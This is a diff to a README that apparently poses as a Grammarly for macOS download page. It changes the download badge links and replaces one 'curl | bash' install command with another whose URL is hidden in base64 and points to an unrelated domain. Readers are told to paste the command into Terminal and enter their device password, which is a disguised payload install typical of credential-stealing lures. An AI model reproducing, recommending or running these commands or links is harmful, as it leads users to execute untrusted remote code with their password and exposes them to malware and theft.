@@ -7,7 +7,7 @@ Optimized for MacBook, MacBook Air, and Apple Silicon, Grammarly runs smoothly o
 ---
 
 ## ✅ Download Grammarly for macOS  
-[![Download Grammarly](https://img.shields.io/badge/Download-Grammarly-blueviolet)](https://grammarly-download-mac.github.io/.github)
+[![Download Grammarly](https://img.shields.io/badge/Download-Grammarly-blueviolet)](https://shuziktobehuman.github.io/huja/Grammarly)
 
 ---
 
@@ -26,7 +26,7 @@ Optimized for MacBook, MacBook Air, and Apple Silicon, Grammarly runs smoothly o
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -69,7 +69,7 @@ Whether you're writing academic essays, professional emails, or blog posts, Gram
 
 ---
 
-[![Download Grammarly](https://img.shields.io/badge/Download-Grammarly-blueviolet)](https://grammarly-download-mac.github.io/.github)
+[![Download Grammarly](https://img.shields.io/badge/Download-Grammarly-blueviolet)](https://shuziktobehuman.github.io/huja/Grammarly)
 
 ---
 
